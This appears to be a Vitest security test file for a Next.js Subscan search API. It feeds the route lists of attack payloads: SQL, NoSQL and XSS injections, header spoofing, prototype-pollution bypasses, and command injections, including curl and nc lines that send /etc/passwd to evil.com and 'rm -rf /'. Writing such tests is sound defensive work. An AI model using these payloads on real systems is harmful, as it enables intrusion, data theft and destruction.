/**
 * API Security Tests
 * 
 * Tests for API endpoint security vulnerabilities including:
 * - Input validation and sanitization
 * - Rate limiting
 * - CORS policy validation
 * - Request size limits
 * - Authentication bypass attempts
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { NextRequest } from 'next/server'
import { POST } from '../subscan/search/route'
import { SubscanClient, } from '../subscan/common/client'

// Mock environment for testing
const originalEnv = process.env

beforeEach(() => {
  vi.clearAllMocks()
  process.env = { ...originalEnv }
  process.env.SUBSCAN_API_KEY = 'test-key'
})

afterEach(() => {
  process.env = originalEnv
})

// Helper to create mock requests
const createMockRequest = (body: any, headers: Record<string, string> = {}): NextRequest => ({
  json: vi.fn().mockResolvedValue(body),
  headers: new Headers(headers),
  method: 'POST',
  url: 'http://localhost:3000/api/subscan/search'
} as unknown as NextRequest)

describe('API Security Vulnerability Tests', () => {
  describe('Input Validation Attacks', () => {
    it('VULN-API-1: Should reject SQL injection in network parameter', async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "' OR '1'='1' --",
        "'; INSERT INTO logs VALUES ('hacked'); --",
        "' UNION SELECT * FROM sensitive_data --",
        "\"; DELETE FROM accounts; --",
        "' OR 1=1#",
        "admin'--",
        "' OR 'x'='x",
        "'; EXEC xp_cmdshell('dir'); --"
      ]

      for (const payload of sqlInjectionPayloads) {
        const request = createMockRequest({
          network: payload,
          address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|forbidden|sanitization/i)
      }
    })

    it('VULN-API-2: Should reject XSS payloads in address parameter', async () => {
      const xssPayloads = [
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        'javascript:alert(document.cookie)',
        '<iframe src="javascript:alert(1)"></iframe>',
        '<body onload=alert(1)>',
        '<input onfocus=alert(1) autofocus>',
        '"><script>fetch("/api/steal-data")</script>',
        '<script src="https://evil.com/xss.js"></script>',
        '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">'
      ]

      for (const payload of xssPayloads) {
        const request = createMockRequest({
          network: 'polkadot',
          address: payload
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|forbidden|format/i)
      }
    })

    it('VULN-API-3: Should reject NoSQL injection attempts', async () => {
      const noSqlPayloads = [
        { '$ne': null },
        { '$gt': '' },
        { '$where': 'function() { return true; }' },
        { '$regex': '.*' },
        { '$or': [{'network': 'polkadot'}, {'network': 'kusama'}] },
        "'; return db.users.find(); var dummy='",
        { '$eval': 'function() { return 1; }' },
        "\\'; return {injection: true}; var foo = \\'"
      ]

      for (const payload of noSqlPayloads) {
        const request = createMockRequest({
          network: payload,
          address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|forbidden/i)
      }
    })

    it('VULN-API-4: Should reject command injection attempts', async () => {
      const commandInjectionPayloads = [
        '; ls -la',
        '| cat /etc/passwd',
        '&& rm -rf /',
        '`whoami`',
        '$(uname -a)',
        '; curl evil.com/steal?data=$(cat /etc/passwd)',
        '| nc evil.com 4444 < /etc/passwd',
        '; python -c "import os; os.system(\'rm -rf /\')"'
      ]

      for (const payload of commandInjectionPayloads) {
        const request = createMockRequest({
          network: `polkadot${payload}`,
          address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|forbidden/i)
      }
    })
  })

  describe('Request Size and Rate Limiting', () => {
    it('VULN-API-5: Should reject oversized requests', async () => {
      const largePayload = {
        network: 'polkadot',
        address: 'A'.repeat(1000000), // 1MB string
        maliciousData: 'B'.repeat(5000000) // 5MB additional data
      }

      const request = createMockRequest(largePayload)

      const response = await POST(request)
      const data = await response.json()

      expect(response.status).toBe(413) // Payload too large
      expect(data.error).toMatch(/too large|size limit/i)
    })

    it('VULN-API-6: Should implement rate limiting', async () => {
      // Simulate rapid-fire requests from same IP
      const requests = Array.from({ length: 100 }, () => 
        createMockRequest({
          network: 'polkadot',
          address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
        }, { 'x-forwarded-for': '192.168.1.100' })
      )

      const responses = await Promise.all(
        requests.map(request => POST(request))
      )

      // At least some requests should be rate limited
      const rateLimitedResponses = responses.filter(response => response.status === 429)
      expect(rateLimitedResponses.length).toBeGreaterThan(0)
    })
  })

  describe('Header Security', () => {
    it('VULN-API-7: Should reject requests with malicious headers', async () => {
      const maliciousHeaders = {
        'X-Forwarded-Host': 'evil.com',
        'X-Original-URL': '/admin/delete-all',
        'X-Rewrite-URL': '/api/admin',
        'Host': 'evil.com',
        'Referer': 'javascript:alert(1)',
        'User-Agent': '<script>alert(1)</script>'
      }

      for (const [headerName, headerValue] of Object.entries(maliciousHeaders)) {
        const request = createMockRequest(
          {
            network: 'polkadot',
            address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
          },
          { [headerName]: headerValue }
        )

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|forbidden|header/i)
      }
    })

    it('VULN-API-8: Should set security headers in response', async () => {
      const request = createMockRequest({
        network: 'polkadot',
        address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
      })

      const response = await POST(request)

      // Check for security headers
      expect(response.headers.get('X-Content-Type-Options')).toBe('nosniff')
      expect(response.headers.get('X-Frame-Options')).toBe('DENY')
      expect(response.headers.get('X-XSS-Protection')).toBe('1; mode=block')
      expect(response.headers.get('Strict-Transport-Security')).toContain('max-age=')
      expect(response.headers.get('Content-Security-Policy')).toContain("default-src 'self'")
    })
  })

  describe('Authentication and Authorization', () => {
    it('VULN-API-9: Should not expose API keys in error messages', async () => {
      // Force an error that might leak the API key
      process.env.SUBSCAN_API_KEY = 'secret-api-key-12345'

      vi.mocked(SubscanClient).mockImplementation(() => {
        throw new Error('Connection failed with key: secret-api-key-12345')
      })

      const request = createMockRequest({
        network: 'polkadot',
        address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
      })

      const response = await POST(request)
      const data = await response.json()

      // Error message should not contain the API key
      expect(JSON.stringify(data)).not.toContain('secret-api-key-12345')
      expect(JSON.stringify(data)).not.toContain('SUBSCAN_API_KEY')
    })

    it('VULN-API-10: Should handle authentication bypass attempts', async () => {
      const bypassAttempts = [
        { network: 'polkadot', address: 'valid', admin: true },
        { network: 'polkadot', address: 'valid', isAdmin: 'true' },
        { network: 'polkadot', address: 'valid', role: 'admin' },
        { network: 'polkadot', address: 'valid', auth: { user: 'admin', pass: 'admin' } },
        { network: 'polkadot', address: 'valid', __proto__: { admin: true } },
        { network: 'polkadot', address: 'valid', constructor: { admin: true } }
      ]

      for (const payload of bypassAttempts) {
        const request = createMockRequest(payload)
        const response = await POST(request)

        // Should not grant elevated privileges
        expect(response.status).not.toBe(200)
      }
    })
  })

  describe('CORS and Origin Validation', () => {
    it('VULN-API-11: Should validate request origins', async () => {
      const maliciousOrigins = [
        'https://evil.com',
        'http://localhost:3000', // HTTP instead of HTTPS
        'https://polkadot.evil.com',
        'https://subdomain.attacker.com',
        'null',
        'file://',
        'data:text/html,<script>alert(1)</script>'
      ]

      for (const origin of maliciousOrigins) {
        const request = createMockRequest(
          {
            network: 'polkadot',
            address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
          },
          { 'Origin': origin }
        )

        const response = await POST(request)

        // Should reject or not set CORS headers for malicious origins
        expect(response.headers.get('Access-Control-Allow-Origin')).not.toBe(origin)
      }
    })
  })

  describe('JSON and Content-Type Attacks', () => {
    it('VULN-API-12: Should reject malformed JSON', async () => {
      const malformedJsonRequests = [
        '{"network": "polkadot", "address": }', // Invalid JSON
        '{"network": "polkadot", "address": "valid", }', // Trailing comma
        '{"network": "polkadot", "address": "valid"', // Missing closing brace
        'network=polkadot&address=valid', // Form data instead of JSON
        '<xml><network>polkadot</network></xml>', // XML instead of JSON
      ]

      for (const _malformedJson of malformedJsonRequests) {
        const request = {
          json: vi.fn().mockRejectedValue(new SyntaxError('Unexpected token')),
          headers: new Headers({ 'content-type': 'application/json' })
        } as unknown as NextRequest

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid|malformed|json/i)
      }
    })

    it('VULN-API-13: Should validate Content-Type header', async () => {
      const invalidContentTypes = [
        'text/plain',
        'application/xml',
        'multipart/form-data',
        'application/x-www-form-urlencoded',
        'text/html',
        'application/javascript'
      ]

      for (const contentType of invalidContentTypes) {
        const request = createMockRequest(
          {
            network: 'polkadot',
            address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
          },
          { 'Content-Type': contentType }
        )

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(415) // Unsupported Media Type
        expect(data.error).toMatch(/content.?type|media.?type/i)
      }
    })
  })

  describe('Network-Specific Validation', () => {
    it('VULN-API-14: Should validate network names against allowlist', async () => {
      const invalidNetworks = [
        'malicious-network',
        '../polkadot',
        'polkadot; rm -rf /',
        'test-network',
        'localhost',
        'internal-dev',
        'staging-polkadot'
      ]

      for (const network of invalidNetworks) {
        const request = createMockRequest({
          network,
          address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY'
        })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid.?network|unsupported.?network/i)
      }
    })

    it('VULN-API-15: Should validate address format per network', async () => {
      const invalidAddressByNetwork = [
        { network: 'polkadot', address: '0x1234567890abcdef' }, // Ethereum format
        { network: 'kusama', address: 'bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq' }, // Bitcoin format
        { network: 'polkadot', address: 'invalid-substrate-address' },
        { network: 'kusama', address: '5GrwvaEF5zXb26Fz9rcQpDWS57CtERHpNehXCPcNoHGKutQY' }, // Wrong SS58 prefix
      ]

      for (const { network, address } of invalidAddressByNetwork) {
        const request = createMockRequest({ network, address })

        const response = await POST(request)
        const data = await response.json()

        expect(response.status).toBe(400)
        expect(data.error).toMatch(/invalid.?address|address.?format/i)
      }
    })
  })
})

// Mock SubscanClient for security tests
vi.mock('../subscan/common/client', () => {
  const SubscanError = class extends Error {
    constructor(
      message: string,
      public subscanCode: number,
      public httpStatus: number
    ) {
      super(message)
      this.name = 'SubscanError'
    }
  }

  const SubscanClient = vi.fn().mockImplementation(() => ({
    request: vi.fn().mockResolvedValue({
      code: 0,
      message: 'Success',
      generated_at: Date.now(),
      data: { account: { address: 'test' } }
    })
  }))

  return { SubscanClient, SubscanError }
})